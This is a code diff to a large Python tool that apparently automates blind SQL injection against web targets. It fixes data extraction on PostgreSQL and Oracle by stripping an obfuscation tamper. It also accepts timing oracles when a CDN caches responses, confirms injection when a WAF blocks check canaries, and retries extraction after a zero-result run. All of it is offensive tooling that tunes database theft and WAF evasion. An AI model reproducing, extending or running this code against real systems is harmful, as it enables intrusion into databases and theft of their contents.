@@ -25152,6 +25152,12 @@ _PCV_XCAT_DRAINED: set = set()  # BUG-10-FIX: set of id(det) already drained
 # any subsequent confirmed injection on another surface is logged but its
 # extraction is silently skipped.
 _EXTRACTION_DONE: list = [False]
+# BUG-EXTR-ZERO-RETRY FIX: track whether the completed extraction returned zero data.
+# When True, a subsequent confirmed surface may retry extraction once — the first
+# attempt may have failed due to oracle sanity failure (CDN cached both probes).
+# Reset to False once a retry is granted so only ONE retry is ever allowed.
+_EXTRACTION_ZERO_RESULTS: list = [False]
+_EXTRACTION_RETRY_GRANTED: list = [False]  # guard: only one zero-result retry per session
 # FIX FUN-7 (Issue 5): Module-level extraction-started flag. Once set to True, no second
 # extraction can start regardless of which surface (header, param, background task) detected
 # the injection. _EXTRACTION_STARTED[1] stores the surface/param name for diagnostics.
@@ -47249,7 +47255,18 @@ class Enumerator:
         else:
             self.queries = DBMS_QUERIES[_resolved_dbms]
         self.method=method; self.url=url; self.data=data; self.data_fmt=data_fmt
-        self.original=original; self.tamper_chain=tamper_chain; self.baseline=baseline
+        self.original=original; self.baseline=baseline
+        # BUG-ENUM-0x-STRIP FIX: numericobfuscate converts integer literals to 0x hex
+        # (e.g. 1→0x1, 32→0x20). MySQL accepts 0x in integer context; PostgreSQL and
+        # Oracle do NOT — 0x is invalid syntax that causes SQL errors on ALL extraction
+        # probes (UNION, error-based, blind bitwise). Strip for PG/Oracle targets so
+        # all extraction queries use plain decimal literals.
+        _enum_dbms_upper = (_resolved_dbms or '').upper()
+        if _enum_dbms_upper in ('POSTGRESQL', 'ORACLE', 'COCKROACHDB', 'YUGABYTEDB',
+                                'AMAZON REDSHIFT', 'GREENPLUM', 'DUCKDB'):
+            self.tamper_chain = [t for t in (tamper_chain or []) if t != 'numericobfuscate']
+        else:
+            self.tamper_chain = tamper_chain
         # BUG-EXTR-B FIX: Cache the injection parameter here so _extract_str's
         # self-calibrating oracle path can always find it without falling back
         # to the wrong default ("id").  result.param is the authoritative source;
@@ -47900,6 +47917,24 @@ class Enumerator:
                             LOG.info("[_extract_str] timing oracle accepted after sanity fallback "
                                      "(CDN caches both probes → both False expected; "
                                      "_boolean_oracle_is_timing=True on mse_instance)")
+                        elif _bool_oracle and getattr(
+                                getattr(self, 'config', None), '_oracle_mode', None
+                        ) in (OracleMode.TIMING_ONLY, 'TIMING_ONLY'):
+                            # BUG-CDN-SANITY-TIMINGONLY FIX: When oracle mode is TIMING_ONLY,
+                            # boolean sanity (1=1→True, 1=2→False) can NEVER pass on CDN targets
+                            # because the CDN returns the same cached response for both probes.
+                            # TIMING_ONLY mode means boolean signals are unreliable — which is
+                            # exactly why this sanity check failed. Accept the timing oracle
+                            # directly and mark it as timing so downstream code handles it correctly.
+                            _eval_fn = _bool_oracle
+                            _oracle_name = "mse_oracle_timing_only_mode"
+                            try:
+                                self._mse_instance._boolean_oracle_is_timing = True
+                            except Exception:
+                                pass
+                            LOG.info("[_extract_str] oracle mode=TIMING_ONLY: accepting oracle despite "
+                                     "boolean sanity failure (CDN caches 1=1/1=2 → both False; "
+                                     "timing oracle bypasses CDN cache via sleep signal)")
                         else:
                             LOG.warning("[_extract_str] mse_boolean oracle failed sanity after "
                                         "3 attempts (1=1→%r, 1=2→%r); discarding",
@@ -82639,6 +82674,15 @@ class BitwiseExtractor:
                               "equaltolike","unicodeencode","utf8encode","htmlencode_all",
                               "tripleurlencode",
                           "json_unicode_escape","hex_entities","unicode_fullwidth"}
+        # BUG-BWE-0x-STRIP FIX: numericobfuscate converts integer literals to 0x hex
+        # (e.g. 1 → 0x1, 128 → 0x80). MySQL accepts 0x hex in integer context; PostgreSQL
+        # and Oracle do NOT — 0x is invalid syntax and causes immediate SQL error on every
+        # bitwise probe. Strip numericobfuscate for PG/Oracle targets so extraction SQL
+        # uses plain decimal literals that both DBMSes understand.
+        _bwe_dbms = getattr(result, 'dbms', '') or ''
+        if _bwe_dbms.upper() in ('POSTGRESQL', 'ORACLE', 'COCKROACHDB', 'YUGABYTEDB',
+                                 'AMAZON REDSHIFT', 'GREENPLUM', 'DUCKDB'):
+            _BWE_EXTRACT_STRIP = _BWE_EXTRACT_STRIP | {"numericobfuscate"}
         self.tamper_chain = [t for t in (tamper_chain or []) if t not in _BWE_EXTRACT_STRIP]
         self.baseline     = baseline
         self._requests    = 0
@@ -92129,7 +92173,17 @@ class ZKBooleanExtractor:
         self.engine = engine; self.config = config; self.result = result
         self.queries = queries; self.method = method; self.url = url
         self.data = data; self.data_fmt = data_fmt; self.original = original
-        self.tamper_chain = tamper_chain
+        # BUG-ZK-0x-STRIP FIX: numericobfuscate converts integer literals to 0x hex.
+        # MySQL accepts 0x in integer context; PostgreSQL and Oracle do NOT — 0x is
+        # invalid syntax causing SQL error on every timing/boolean probe → oracle always
+        # returns immediately (error-fast response) → elapsed_ms≈0 → oracle always False.
+        # Strip numericobfuscate from the tamper chain for PG/Oracle targets.
+        _zk_dbms = getattr(result, 'dbms', '') or ''
+        if _zk_dbms.upper() in ('POSTGRESQL', 'ORACLE', 'COCKROACHDB', 'YUGABYTEDB',
+                                'AMAZON REDSHIFT', 'GREENPLUM', 'DUCKDB'):
+            self.tamper_chain = [t for t in (tamper_chain or []) if t != 'numericobfuscate']
+        else:
+            self.tamper_chain = tamper_chain
         self.t_sec    = max(1.5, config.time_sec / 3)
         self._requests = 0
         self._baseline_rtt: List[float] = []   # calibrated on first ask()
@@ -105806,8 +105860,13 @@ class TechniqueCascadeEngine:
                                     _wn_m = _re_wn.search(r'wasserstein_dist=(\d+\.\d+)', _det_notes_str)
                                     if _wn_m:
                                         _det_wass_dist = float(_wn_m.group(1))
-                                        _wn_min = max(getattr(
-                                            _GLOBAL_WASSERSTEIN, 'threshold', 0.012) * 2.0, 0.15)
+                                        # BUG-WASS-OVERRIDE-THRESHOLD FIX: was _GLOBAL_WASSERSTEIN.threshold*2.0
+                                        # which on dynamic pages can reach 0.80+ (2× the calibrated page noise
+                                        # floor), far above the 0.350-capped detection threshold. A dist=0.666
+                                        # that fired detection would then fail the override (0.666 < 0.80).
+                                        # Fix: use self._dynamic_wass (capped at 0.350) — the same threshold
+                                        # that gated the original detection, so override fires whenever detection fired.
+                                        _wn_min = max(getattr(self, '_dynamic_wass', 0.35), 0.15)
                                         if _det_wass_dist >= _wn_min:
                                             _wassr_override = True
                                             print(f"[+] PCV FP-Guards WASSR OVERRIDE (det-notes) "
@@ -106028,7 +106087,8 @@ class TechniqueCascadeEngine:
                 # clear it so the scan can continue looking for a genuine injection.
                 if _confirmed_event_set:
                     _extr_started_tb = (
-                        _EXTRACTION_STARTED[0] or _EXTRACTION_ACTIVE[0] or _EXTRACTION_DONE[0])
+                        _EXTRACTION_STARTED[0] or _EXTRACTION_ACTIVE[0] or _EXTRACTION_DONE[0]
+                        or _INJECTION_CONFIRMED[0])  # BUG-RACE-CONFIRMED-CLEAR FIX: never clear when another task already confirmed
                     if not _extr_started_tb:
                         try:
                             if _cev_self and _cev_self.is_set():
@@ -106047,6 +106107,7 @@ class TechniqueCascadeEngine:
                 # the primary surface had already extracted data and finished.
                 _safe_to_restore = (
                     not _prev_scan_stopped
+                    and not _INJECTION_CONFIRMED[0]   # BUG-RACE-RESTORE FIX: matches _run_pcv_check; prevents failed concurrent PCV task from resetting scan-stop after Wasserstein/Early-Shortcut-A confirmed injection
                     and not _EXTRACTION_STARTED[0]
                     and not _EXTRACTION_ACTIVE[0]
                     and not _EXTRACTION_DONE[0]
@@ -108477,6 +108538,30 @@ class TechniqueCascadeEngine:
                 _INJECTION_CONFIRMED[0] = True  # BUG-RESTORE-RACE FIX
                 _SCAN_STOPPED[0] = True
                 return True, 2, _details
+
+        # BUG-CHECKD-STANDALONE-WAF FIX: When WAF blocks ALL Check A canaries,
+        # Check A always fails (gap=0 on identical WAF-blocked bodies), yet SQL injection
+        # may still be real. The existing `if _d_pass and _a_pass` path at line ~108440
+        # AND-gates Check D with Check A — making confirmation impossible on WAF targets.
+        # Fix: when _check_a_all_waf_blocked=True AND content-length genuinely differs
+        # (Check D passes), accept that as standalone confirmation. Content-length diff on
+        # a WAF target is meaningful because: (a) both true/false conditions were sent
+        # without WAF blocks (non-4xx status on the detection payload), (b) CDN returns
+        # the same cached header for random noise, (c) SQL-conditional changes to the
+        # response body directly change content-length deterministically.
+        # Exclude timing/stacked techniques (body unchanged), error pages (status varies
+        # independently), and require at least 1 header diff (_d_count >= 1).
+        if (_d_pass
+                and not _a_pass
+                and _check_a_all_waf_blocked
+                and tech not in ("S", "HQ", "T", "BT", "TH", "DS")
+                and not _is_error_page):
+            print(f"[*]   [PCV] Result: CONFIRMED  header diff ({_d_count}) standalone "
+                  "(all Check A canaries WAF-blocked — content-length diffs prove SQL conditional branch, "
+                  f"body gap inapplicable [tech={tech} dbms={dbms}])", flush=True)
+            _INJECTION_CONFIRMED[0] = True
+            _SCAN_STOPPED[0] = True
+            return True, 1, _details
 
         # Check E + borderline A  SQL logic confirmed (not for stacked queries)
         if _e_pass and _a_pass and tech not in ("S", "HQ", "T", "BT", "TH", "DS"):
@@ -116047,7 +116132,7 @@ class TechniqueCascadeEngine:
                                     _det_x = DetectionResult(
                                         param=param, technique=tech, payload=payload, dbms=dbms,
                                         confidence=min(0.72, 0.55 + _wdist * 0.5),
-                                        notes=f"cascade_header_bh wasserstein={_wdist:.4f} bypass=none")
+                                        notes=f"cascade_header_bh wasserstein_dist={_wdist:.4f} bypass=none")  # BUG-BH-NOTES-KEY FIX: was wasserstein= (PCV regex searches wasserstein_dist=)
                                     try:
                                         _det_x.exact_sent_payload = DetectionResult.compute_exact_payload(
                                             original + payload, self.tamper_chain)
@@ -141724,9 +141809,30 @@ class ExtractionOrchestrator:
                         _EXTRACTION_ACTIVE[0] = True
                         _orch_claimed_extraction = True
         elif _EXTRACTION_DONE[0]:
-            # Another coroutine already completed extraction — skip duplicate run
-            LOG.info("[Orchestrator] Extraction already done — skipping duplicate extract() call")
-            return ""
+            # BUG-EXTR-ZERO-RETRY FIX: if previous extraction produced zero results and
+            # we haven't granted a retry yet, reset DONE and allow this surface to try.
+            # Root cause: oracle sanity failure (CDN cached 1=1/1=2 responses) causes
+            # extraction to return "" and set DONE=True, blocking all subsequent attempts.
+            if (_EXTRACTION_ZERO_RESULTS[0]
+                    and not _EXTRACTION_RETRY_GRANTED[0]
+                    and not _EXTRACTION_ACTIVE[0]):
+                LOG.info("[Orchestrator] Previous extraction returned zero results — "
+                         "granting ONE retry for this surface (CDN oracle sanity may have failed)")
+                _EXTRACTION_ZERO_RESULTS[0] = False
+                _EXTRACTION_RETRY_GRANTED[0] = True
+                _EXTRACTION_DONE[0] = False  # allow claim below
+                # Fall through to the normal claim path
+                try:
+                    _orch_claimed_extraction = await _start_extraction_safely()
+                except Exception as _orch_se2:
+                    with _EXTRACTION_LOCK_GUARD:
+                        if not _EXTRACTION_ACTIVE[0] and not _EXTRACTION_DONE[0]:
+                            _EXTRACTION_ACTIVE[0] = True
+                            _orch_claimed_extraction = True
+            else:
+                # Another coroutine already completed extraction — skip duplicate run
+                LOG.info("[Orchestrator] Extraction already done — skipping duplicate extract() call")
+                return ""
 
         waf_active = bool(self.waf_name)
         technique  = self.result.technique
@@ -141790,6 +141896,14 @@ class ExtractionOrchestrator:
             # re-attempt extraction on its next confirmation cycle.
             if _orch_claimed_extraction and result:
                 _EXTRACTION_DONE[0] = True
+            elif _orch_claimed_extraction and not result:
+                # BUG-EXTR-ZERO-RETRY FIX: zero-result extraction — mark DONE to block
+                # immediate parallel retries, but set _EXTRACTION_ZERO_RESULTS so a
+                # subsequent surface can get ONE retry via the gate above.
+                _EXTRACTION_DONE[0] = True
+                _EXTRACTION_ZERO_RESULTS[0] = True
+                LOG.info("[Orchestrator] Extraction returned zero results — "
+                         "next confirmed surface may retry once (_EXTRACTION_ZERO_RESULTS=True)")
             if self._poisoner:
                 try:
                     await self._poisoner.stop()
